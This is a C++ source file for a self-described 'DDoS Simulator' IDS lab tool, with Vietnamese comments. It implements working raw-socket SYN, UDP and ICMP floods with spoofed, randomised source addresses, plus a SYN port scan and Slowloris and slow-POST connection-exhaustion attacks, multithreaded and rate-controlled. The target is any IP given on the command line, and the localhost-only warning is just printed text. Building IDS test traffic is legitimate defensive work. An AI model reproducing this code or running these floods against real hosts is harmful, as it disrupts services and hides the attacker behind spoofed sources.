// tools/ddos_sim/main.cpp
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>
#include <csignal>
#include <cstring>
#include <cstdlib>
#include <vector>
#include <random>
#include <sstream>
#include <iomanip>

#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <sys/types.h>

// ─────────────────────────────────────────────────────────────────────────────
//  Global
// ─────────────────────────────────────────────────────────────────────────────
static std::atomic<bool>     g_running{true};
static std::atomic<uint64_t> g_sent{0};
static std::atomic<uint64_t> g_failed{0};

void sigHandler(int) { g_running = false; }

// ─────────────────────────────────────────────────────────────────────────────
//  Checksum (RFC 1071)
// ─────────────────────────────────────────────────────────────────────────────
static uint16_t checksum(const void* data, size_t len) {
    const auto* ptr = reinterpret_cast<const uint16_t*>(data);
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len) sum += *reinterpret_cast<const uint8_t*>(ptr);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return static_cast<uint16_t>(~sum);
}

// TCP/UDP pseudo-header để tính checksum
struct PseudoHeader {
    uint32_t src_ip;
    uint32_t dst_ip;
    uint8_t  zero     = 0;
    uint8_t  protocol;
    uint16_t tcp_len;
};

static uint16_t tcpChecksum(const iphdr* ip, const tcphdr* tcp,
                              const uint8_t* payload, size_t payload_len) {
    PseudoHeader ph{};
    ph.src_ip   = ip->saddr;
    ph.dst_ip   = ip->daddr;
    ph.protocol = IPPROTO_TCP;
    ph.tcp_len  = htons(sizeof(tcphdr) + payload_len);

    const size_t total = sizeof(PseudoHeader) + sizeof(tcphdr) + payload_len;
    std::vector<uint8_t> buf(total, 0);
    size_t off = 0;
    memcpy(buf.data() + off, &ph,  sizeof(ph));       off += sizeof(ph);
    memcpy(buf.data() + off, tcp,  sizeof(tcphdr));   off += sizeof(tcphdr);
    if (payload_len) memcpy(buf.data() + off, payload, payload_len);
    return checksum(buf.data(), total);
}

static uint16_t udpChecksum(const iphdr* ip, const udphdr* udp,
                              const uint8_t* payload, size_t payload_len) {
    PseudoHeader ph{};
    ph.src_ip   = ip->saddr;
    ph.dst_ip   = ip->daddr;
    ph.protocol = IPPROTO_UDP;
    ph.tcp_len  = htons(sizeof(udphdr) + payload_len);

    const size_t total = sizeof(PseudoHeader) + sizeof(udphdr) + payload_len;
    std::vector<uint8_t> buf(total, 0);
    size_t off = 0;
    memcpy(buf.data() + off, &ph,  sizeof(ph));       off += sizeof(ph);
    memcpy(buf.data() + off, udp,  sizeof(udphdr));   off += sizeof(udphdr);
    if (payload_len) memcpy(buf.data() + off, payload, payload_len);
    return checksum(buf.data(), total);
}

// ─────────────────────────────────────────────────────────────────────────────
//  Config
// ─────────────────────────────────────────────────────────────────────────────
enum class AttackType {
    SYN_FLOOD,
    UDP_FLOOD,
    ICMP_FLOOD,
    PORT_SCAN,
    SLOWLORIS,
    SLOW_POST,
};

struct Config {
    AttackType  type        = AttackType::SYN_FLOOD;
    std::string src_ip      = "10.0.0.1";   // spoofed source
    std::string dst_ip      = "127.0.0.1";
    uint16_t    dst_port    = 80;
    uint32_t    rate_pps    = 500;           // packets per second (0 = max)
    uint32_t    duration_s  = 10;
    int         num_threads = 1;
    bool        rand_src    = true;          // random source IP
    bool        rand_sport  = true;          // random source port
    size_t      payload_len = 0;
};

// ─────────────────────────────────────────────────────────────────────────────
//  Raw socket helpers
// ─────────────────────────────────────────────────────────────────────────────
static int createRawSocket(int protocol) {
    const int fd = socket(AF_INET, SOCK_RAW, protocol);
    if (fd < 0) {
        perror("socket(SOCK_RAW)");
        std::cerr << "  → Cần chạy với sudo!\n";
        exit(1);
    }
    int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt(IP_HDRINCL)");
        exit(1);
    }
    return fd;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Packet builders
// ─────────────────────────────────────────────────────────────────────────────

// ── SYN packet ────────────────────────────────────────────────────────────────
static bool sendSYN(int fd, uint32_t src_ip, uint16_t src_port,
                     uint32_t dst_ip, uint16_t dst_port) {
    constexpr size_t PKT_LEN = sizeof(iphdr) + sizeof(tcphdr);
    uint8_t buf[PKT_LEN]{};

    auto* ip  = reinterpret_cast<iphdr*>(buf);
    auto* tcp = reinterpret_cast<tcphdr*>(buf + sizeof(iphdr));

    ip->ihl      = 5;
    ip->version  = 4;
    ip->tos      = 0;
    ip->tot_len  = htons(PKT_LEN);
    ip->id       = htons(rand() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check    = 0;
    ip->saddr    = src_ip;
    ip->daddr    = dst_ip;
    ip->check    = checksum(ip, sizeof(iphdr));

    tcp->source  = htons(src_port);
    tcp->dest    = htons(dst_port);
    tcp->seq     = htonl(rand());
    tcp->ack_seq = 0;
    tcp->doff    = 5;
    tcp->syn     = 1;
    tcp->window  = htons(65535);
    tcp->check   = 0;
    tcp->check   = tcpChecksum(ip, tcp, nullptr, 0);

    sockaddr_in dst{};
    dst.sin_family      = AF_INET;
    dst.sin_port        = tcp->dest;
    dst.sin_addr.s_addr = dst_ip;

    return sendto(fd, buf, PKT_LEN, 0,
                  reinterpret_cast<sockaddr*>(&dst), sizeof(dst)) > 0;
}

// ── UDP packet ────────────────────────────────────────────────────────────────
static bool sendUDP(int fd, uint32_t src_ip, uint16_t src_port,
                     uint32_t dst_ip, uint16_t dst_port,
                     size_t payload_len = 64) {
    const size_t PKT_LEN = sizeof(iphdr) + sizeof(udphdr) + payload_len;
    std::vector<uint8_t> buf(PKT_LEN, 0xAB);

    auto* ip  = reinterpret_cast<iphdr*>(buf.data());
    auto* udp = reinterpret_cast<udphdr*>(buf.data() + sizeof(iphdr));

    ip->ihl      = 5;
    ip->version  = 4;
    ip->tot_len  = htons(PKT_LEN);
    ip->id       = htons(rand() & 0xFFFF);
    ip->ttl      = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check    = 0;
    ip->saddr    = src_ip;
    ip->daddr    = dst_ip;
    ip->check    = checksum(ip, sizeof(iphdr));

    udp->source = htons(src_port);
    udp->dest   = htons(dst_port);
    udp->len    = htons(sizeof(udphdr) + payload_len);
    udp->check  = 0;
    udp->check  = udpChecksum(ip, udp,
                               buf.data() + sizeof(iphdr) + sizeof(udphdr),
                               payload_len);

    sockaddr_in dst{};
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = dst_ip;

    return sendto(fd, buf.data(), PKT_LEN, 0,
                  reinterpret_cast<sockaddr*>(&dst), sizeof(dst)) > 0;
}

// ── ICMP Echo Request ─────────────────────────────────────────────────────────
static bool sendICMP(int fd, uint32_t src_ip, uint32_t dst_ip) {
    constexpr size_t PKT_LEN = sizeof(iphdr) + sizeof(icmphdr) + 56;
    uint8_t buf[PKT_LEN]{};

    auto* ip   = reinterpret_cast<iphdr*>(buf);
    auto* icmp = reinterpret_cast<icmphdr*>(buf + sizeof(iphdr));

    ip->ihl      = 5;
    ip->version  = 4;
    ip->tot_len  = htons(PKT_LEN);
    ip->id       = htons(rand() & 0xFFFF);
    ip->ttl      = 64;
    ip->protocol = IPPROTO_ICMP;
    ip->check    = 0;
    ip->saddr    = src_ip;
    ip->daddr    = dst_ip;
    ip->check    = checksum(ip, sizeof(iphdr));

    icmp->type             = ICMP_ECHO;
    icmp->code             = 0;
    icmp->un.echo.id       = htons(getpid() & 0xFFFF);
    icmp->un.echo.sequence = htons(rand() & 0xFFFF);
    icmp->checksum         = 0;
    icmp->checksum         = checksum(icmp, sizeof(icmphdr) + 56);

    sockaddr_in dst{};
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = dst_ip;

    return sendto(fd, buf, PKT_LEN, 0,
                  reinterpret_cast<sockaddr*>(&dst), sizeof(dst)) > 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Attack workers
// ─────────────────────────────────────────────────────────────────────────────

// ── Rate limiter helper ───────────────────────────────────────────────────────
//  Trả về khoảng sleep (ns) giữa 2 packet để đạt rate_pps
static uint64_t nsPerPacket(uint32_t rate_pps, int num_threads) {
    if (rate_pps == 0) return 0;
    const double total_pps = static_cast<double>(rate_pps);
    const double pps_per_thread = total_pps / num_threads;
    return static_cast<uint64_t>(1e9 / pps_per_thread);
}

// ── Random IP trong dải 10.x.x.x ─────────────────────────────────────────────
static uint32_t randSrcIp(std::mt19937& rng) {
    std::uniform_int_distribution<uint32_t> dist(1, 254);
    // 10.dist.dist.dist
    const uint32_t ip = (10u << 24) | (dist(rng) << 16)
                      | (dist(rng) << 8) | dist(rng);
    return htonl(ip);
}

static uint16_t randSrcPort(std::mt19937& rng) {
    std::uniform_int_distribution<uint16_t> dist(1024, 65535);
    return dist(rng);
}

// ── SYN Flood worker ──────────────────────────────────────────────────────────
static void synFloodWorker(const Config& cfg, int thread_id) {
    const int fd = createRawSocket(IPPROTO_TCP);
    std::mt19937 rng(std::random_device{}() ^ thread_id);

    const uint32_t fixed_src = inet_addr(cfg.src_ip.c_str());
    const uint32_t dst_ip    = inet_addr(cfg.dst_ip.c_str());
    const uint64_t ns_sleep  = nsPerPacket(cfg.rate_pps, cfg.num_threads);

    while (g_running) {
        const uint32_t src_ip   = cfg.rand_src   ? randSrcIp(rng)   : fixed_src;
        const uint16_t src_port = cfg.rand_sport  ? randSrcPort(rng) : 12345;

        if (sendSYN(fd, src_ip, src_port, dst_ip, cfg.dst_port))
            g_sent.fetch_add(1, std::memory_order_relaxed);
        else
            g_failed.fetch_add(1, std::memory_order_relaxed);

        if (ns_sleep > 0)
            std::this_thread::sleep_for(std::chrono::nanoseconds(ns_sleep));
    }
    close(fd);
}

// ── UDP Flood worker ──────────────────────────────────────────────────────────
static void udpFloodWorker(const Config& cfg, int thread_id) {
    const int fd = createRawSocket(IPPROTO_UDP);
    std::mt19937 rng(std::random_device{}() ^ thread_id);

    const uint32_t fixed_src = inet_addr(cfg.src_ip.c_str());
    const uint32_t dst_ip    = inet_addr(cfg.dst_ip.c_str());
    const uint64_t ns_sleep  = nsPerPacket(cfg.rate_pps, cfg.num_threads);

    while (g_running) {
        const uint32_t src_ip   = cfg.rand_src   ? randSrcIp(rng)   : fixed_src;
        const uint16_t src_port = cfg.rand_sport  ? randSrcPort(rng) : 54321;

        if (sendUDP(fd, src_ip, src_port, dst_ip, cfg.dst_port,
                    cfg.payload_len ? cfg.payload_len : 64))
            g_sent.fetch_add(1, std::memory_order_relaxed);
        else
            g_failed.fetch_add(1, std::memory_order_relaxed);

        if (ns_sleep > 0)
            std::this_thread::sleep_for(std::chrono::nanoseconds(ns_sleep));
    }
    close(fd);
}

// ── ICMP Flood worker ─────────────────────────────────────────────────────────
static void icmpFloodWorker(const Config& cfg, int thread_id) {
    const int fd = createRawSocket(IPPROTO_ICMP);
    std::mt19937 rng(std::random_device{}() ^ thread_id);

    const uint32_t fixed_src = inet_addr(cfg.src_ip.c_str());
    const uint32_t dst_ip    = inet_addr(cfg.dst_ip.c_str());
    const uint64_t ns_sleep  = nsPerPacket(cfg.rate_pps, cfg.num_threads);

    while (g_running) {
        const uint32_t src_ip = cfg.rand_src ? randSrcIp(rng) : fixed_src;

        if (sendICMP(fd, src_ip, dst_ip))
            g_sent.fetch_add(1, std::memory_order_relaxed);
        else
            g_failed.fetch_add(1, std::memory_order_relaxed);

        if (ns_sleep > 0)
            std::this_thread::sleep_for(std::chrono::nanoseconds(ns_sleep));
    }
    close(fd);
}

// ── Port Scan worker ──────────────────────────────────────────────────────────
//  Quét tuần tự port 1→65535, mỗi port 1 SYN, không ACK → trigger PORT_SCAN
static void portScanWorker(const Config& cfg, int /*thread_id*/) {
    const int fd = createRawSocket(IPPROTO_TCP);

    const uint32_t src_ip = inet_addr(cfg.src_ip.c_str());
    const uint32_t dst_ip = inet_addr(cfg.dst_ip.c_str());

    // Delay giữa các port để giả lập nmap -T2
    const uint64_t ns_sleep = nsPerPacket(cfg.rate_pps, 1);

    for (uint16_t port = 1; port > 0 && g_running; ++port) {
        if (sendSYN(fd, src_ip, 54321, dst_ip, port))
            g_sent.fetch_add(1, std::memory_order_relaxed);
        else
            g_failed.fetch_add(1, std::memory_order_relaxed);

        if (ns_sleep > 0)
            std::this_thread::sleep_for(std::chrono::nanoseconds(ns_sleep));
    }
    close(fd);
}

// ── Slowloris worker ──────────────────────────────────────────────────────────
//  Mở nhiều TCP connection đến port 80, gửi partial HTTP header
//  mỗi 15s gửi thêm 1 header line → giữ connection sống
static void slowlorisWorker(const Config& cfg, int thread_id) {
    // Slowloris dùng TCP thông thường (không cần raw socket)
    std::mt19937 rng(std::random_device{}() ^ thread_id);

    const std::string dst = cfg.dst_ip;
    const uint16_t    port = cfg.dst_port;

    // Mỗi worker mở 30 connection
    constexpr int CONNS_PER_WORKER = 30;
    std::vector<int> fds;
    fds.reserve(CONNS_PER_WORKER);

    // Mở connections
    for (int i = 0; i < CONNS_PER_WORKER && g_running; ++i) {
        const int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;

        // Non-blocking connect
        sockaddr_in addr{};
        addr.sin_family      = AF_INET;
        addr.sin_port        = htons(port);
        addr.sin_addr.s_addr = inet_addr(dst.c_str());

        if (connect(s, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
            close(s);
            continue;
        }

        // Gửi partial HTTP header (không có \r\n\r\n)
        const std::string partial =
            "GET / HTTP/1.1\r\n"
            "Host: " + dst + "\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "X-a: b\r\n";   // Slowloris signature

        send(s, partial.c_str(), partial.size(), MSG_NOSIGNAL);
        fds.push_back(s);
        g_sent.fetch_add(1, std::memory_order_relaxed);
    }

    std::cout << "  [Slowloris] Thread " << thread_id
              << ": " << fds.size() << " connections opened\n";

    // Keep-alive loop: mỗi 15s gửi thêm header line
    while (g_running && !fds.empty()) {
        std::this_thread::sleep_for(std::chrono::seconds(15));

        for (auto it = fds.begin(); it != fds.end(); ) {
            const std::string keepalive = "X-a: b\r\n";
            const ssize_t sent = send(*it, keepalive.c_str(),
                                       keepalive.size(), MSG_NOSIGNAL);
            if (sent <= 0) {
                close(*it);
                it = fds.erase(it);
            } else {
                g_sent.fetch_add(1, std::memory_order_relaxed);
                ++it;
            }
        }
        std::cout << "  [Slowloris] Thread " << thread_id
                  << ": " << fds.size() << " connections alive\n";
    }

    for (int s : fds) close(s);
}

// ── Slow POST worker ──────────────────────────────────────────────────────────
//  Gửi POST request với Content-Length lớn, body gửi rất chậm (1 byte/30s)
static void slowPostWorker(const Config& cfg, int thread_id) {
    const std::string dst  = cfg.dst_ip;
    const uint16_t    port = cfg.dst_port;

    constexpr int CONNS_PER_WORKER = 10;

    for (int i = 0; i < CONNS_PER_WORKER && g_running; ++i) {
        const int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;

        sockaddr_in addr{};
        addr.sin_family      = AF_INET;
        addr.sin_port        = htons(port);
        addr.sin_addr.s_addr = inet_addr(dst.c_str());

        if (connect(s, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
            close(s);
            continue;
        }

        // Gửi header với Content-Length lớn
        const std::string header =
            "POST /upload HTTP/1.1\r\n"
            "Host: " + dst + "\r\n"
            "Content-Type: application/octet-stream\r\n"
            "Content-Length: 1000000\r\n"  // 1MB nhưng gửi rất chậm
            "\r\n";

        send(s, header.c_str(), header.size(), MSG_NOSIGNAL);
        g_sent.fetch_add(1, std::memory_order_relaxed);

        // Gửi body cực chậm: 1 byte mỗi 30s
        std::thread([s, &cfg]() {
            const uint8_t byte = 'A';
            while (g_running) {
                std::this_thread::sleep_for(std::chrono::seconds(30));
                if (send(s, &byte, 1, MSG_NOSIGNAL) <= 0) break;
                g_sent.fetch_add(1, std::memory_order_relaxed);
            }
            close(s);
        }).detach();
    }

    std::cout << "  [SlowPOST] Thread " << thread_id
              << ": " << CONNS_PER_WORKER << " connections sending\n";

    // Giữ worker sống
    while (g_running)
        std::this_thread::sleep_for(std::chrono::seconds(1));
}

// ─────────────────────────────────────────────────────────────────────────────
//  Stats printer
// ─────────────────────────────────────────────────────────────────────────────
static void statsPrinter(const Config& cfg) {
    uint64_t prev_sent = 0;
    auto     prev_time = std::chrono::steady_clock::now();

    while (g_running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));

        const uint64_t cur_sent = g_sent.load(std::memory_order_relaxed);
        const auto     cur_time = std::chrono::steady_clock::now();
        const double   elapsed  = std::chrono::duration<double>(
                                      cur_time - prev_time).count();
        const double   pps      = (cur_sent - prev_sent) / elapsed;

        std::cout << "\r\033[K"   // clear line
                  << "\033[33m[SIM]\033[0m"
                  << " sent=" << std::setw(8) << cur_sent
                  << " fail=" << std::setw(5) << g_failed.load()
                  << " rate=" << std::fixed << std::setprecision(0)
                  << std::setw(7) << pps << " pps"
                  << std::flush;

        prev_sent = cur_sent;
        prev_time = cur_time;
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────────────────────────────────────
//  CLI
// ─────────────────────────────────────────────────────────────────────────────
static void printUsage(const char* prog) {
    std::cout
        << "\n\033[1mDDoS Simulator — IDS Lab Testing Tool\033[0m\n"
        << "  Chỉ dùng trên localhost/loopback để test IDS!\n"
        << "─────────────────────────────────────────────────\n"
        << "Usage: " << prog << " --type <attack> [options]\n\n"
        << "Attack types:\n"
        << "  syn-flood    SYN Flood (trigger DDOS_VOLUMETRIC)\n"
        << "  udp-flood    UDP Flood (trigger DDOS_VOLUMETRIC)\n"
        << "  icmp-flood   ICMP Flood (trigger DDOS_VOLUMETRIC)\n"
        << "  port-scan    Port Scan (trigger PORT_SCAN)\n"
        << "  slowloris    Slowloris (trigger SLOW_DDOS)\n"
        << "  slow-post    Slow POST (trigger SLOW_DDOS)\n\n"
        << "Options:\n"
        << "  --dst-ip     IP đích       (default: 127.0.0.1)\n"
        << "  --dst-port   Port đích     (default: 80)\n"
        << "  --src-ip     IP nguồn      (default: 10.0.0.1, bị spoof)\n"
        << "  --rate       Packets/s     (default: 500, 0=max)\n"
        << "  --duration   Giây          (default: 10)\n"
        << "  --threads    Số thread     (default: 1)\n"
        << "  --no-rand    Không random src IP/port\n\n"
        << "Examples:\n"
        << "  sudo " << prog << " --type syn-flood --rate 1000 --duration 15\n"
        << "  sudo " << prog << " --type port-scan --rate 200\n"
        << "  sudo " << prog << " --type slowloris --dst-port 80\n"
        << "  sudo " << prog << " --type udp-flood --threads 4 --rate 2000\n\n";
}

static bool parseArgs(int argc, char* argv[], Config& cfg) {
    for (int i = 1; i < argc; ++i) {
        const std::string arg = argv[i];

        if (arg == "--type" && i + 1 < argc) {
            const std::string t = argv[++i];
            if      (t == "syn-flood")  cfg.type = AttackType::SYN_FLOOD;
            else if (t == "udp-flood")  cfg.type = AttackType::UDP_FLOOD;
            else if (t == "icmp-flood") cfg.type = AttackType::ICMP_FLOOD;
            else if (t == "port-scan")  cfg.type = AttackType::PORT_SCAN;
            else if (t == "slowloris")  cfg.type = AttackType::SLOWLORIS;
            else if (t == "slow-post")  cfg.type = AttackType::SLOW_POST;
            else { std::cerr << "Unknown type: " << t << "\n"; return false; }
        }
        else if (arg == "--dst-ip"   && i+1 < argc) cfg.dst_ip     = argv[++i];
        else if (arg == "--dst-port" && i+1 < argc) cfg.dst_port   = std::stoi(argv[++i]);
        else if (arg == "--src-ip"   && i+1 < argc) cfg.src_ip     = argv[++i];
        else if (arg == "--rate"     && i+1 < argc) cfg.rate_pps   = std::stoi(argv[++i]);
        else if (arg == "--duration" && i+1 < argc) cfg.duration_s = std::stoi(argv[++i]);
        else if (arg == "--threads"  && i+1 < argc) cfg.num_threads= std::stoi(argv[++i]);
        else if (arg == "--no-rand")  { cfg.rand_src = false; cfg.rand_sport = false; }
        else if (arg == "--help")     return false;
    }
    return true;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Main
// ─────────────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    Config cfg;
    if (argc < 2 || !parseArgs(argc, argv, cfg)) {
        printUsage(argv[0]);
        return 1;
    }

    signal(SIGINT,  sigHandler);
    signal(SIGTERM, sigHandler);

    // ── Print banner ──────────────────────────────────────────────────────────
    const char* type_names[] = {
        "SYN Flood", "UDP Flood", "ICMP Flood",
        "Port Scan", "Slowloris", "Slow POST"
    };
    const int type_idx = static_cast<int>(cfg.type);

    std::cout << "\033[1;31m"
              << "╔══════════════════════════════════════════╗\n"
              << "║     DDoS Simulator — LAB USE ONLY        ║\n"
              << "╚══════════════════════════════════════════╝\n"
              << "\033[0m"
              << "  Type     : " << type_names[type_idx]   << "\n"
              << "  Target   : " << cfg.dst_ip << ":" << cfg.dst_port << "\n"
              << "  Rate     : " << (cfg.rate_pps ? std::to_string(cfg.rate_pps) + " pps"
                                                  : "MAX") << "\n"
              << "  Duration : " << cfg.duration_s << "s\n"
              << "  Threads  : " << cfg.num_threads << "\n"
              << "  Rand src : " << (cfg.rand_src ? "YES" : "NO") << "\n"
              << "──────────────────────────────────────────────\n";

    // ── Launch workers ────────────────────────────────────────────────────────
    std::vector<std::thread> workers;
    workers.reserve(cfg.num_threads);

    for (int i = 0; i < cfg.num_threads; ++i) {
        switch (cfg.type) {
            case AttackType::SYN_FLOOD:
                workers.emplace_back(synFloodWorker,  std::cref(cfg), i);
                break;
            case AttackType::UDP_FLOOD:
                workers.emplace_back(udpFloodWorker,  std::cref(cfg), i);
                break;
            case AttackType::ICMP_FLOOD:
                workers.emplace_back(icmpFloodWorker, std::cref(cfg), i);
                break;
            case AttackType::PORT_SCAN:
                workers.emplace_back(portScanWorker,  std::cref(cfg), i);
                break;
            case AttackType::SLOWLORIS:
                workers.emplace_back(slowlorisWorker, std::cref(cfg), i);
                break;
            case AttackType::SLOW_POST:
                workers.emplace_back(slowPostWorker,  std::cref(cfg), i);
                break;
        }
    }

    // ── Stats thread ──────────────────────────────────────────────────────────
    std::thread stats_thread(statsPrinter, std::cref(cfg));

    // ── Auto-stop sau duration_s giây ─────────────────────────────────────────
    if (cfg.duration_s > 0) {
        std::this_thread::sleep_for(std::chrono::seconds(cfg.duration_s));
        g_running = false;
        std::cout << "\n\033[33m[SIM] Duration reached, stopping...\033[0m\n";
    } else {
        // Chờ Ctrl+C
        while (g_running)
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    g_running = false;
    for (auto& t : workers) if (t.joinable()) t.join();
    if (stats_thread.joinable()) stats_thread.join();

    // ── Final report ──────────────────────────────────────────────────────────
    std::cout << "\n\033[1;32m"
              << "╔══════════════════════════════════════════╗\n"
              << "║           SIMULATION COMPLETE            ║\n"
              << "╠══════════════════════════════════════════╣\n"
              << "║ Total sent  : "
              << std::setw(10) << g_sent.load()   << "              ║\n"
              << "║ Total failed: "
              << std::setw(10) << g_failed.load() << "              ║\n"
              << "╚══════════════════════════════════════════╝\n"
              << "\033[0m\n";

    return 0;
}
